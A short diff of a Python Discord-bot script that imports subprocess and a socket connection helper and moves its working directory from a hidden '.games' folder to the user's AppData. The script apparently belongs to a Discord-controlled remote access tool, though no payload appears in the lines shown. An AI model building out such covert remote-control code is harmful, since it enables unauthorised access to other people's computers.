@@ -8,9 +8,9 @@ from socket import create_connection
 import discord, os, subprocess, re, time
 
 client, original_dir = discord.Bot(), os.getcwd()
-try: os.mkdir(os.path.join(f"C:\\Users\\{os.getenv('username')}", ".games"))
-except FileExistsError: pass
-nr_working = f"C:\\Users\\{os.getenv('username')}\\.games"
+# try: os.mkdir(os.path.join(f"C:\\Users\\{os.getenv('username')}", ".games"))
+# except FileExistsError: pass
+nr_working = f"C:\\Users\\{os.getenv('username')}\\Appdata"
 
 @client.event
 async def on_ready():
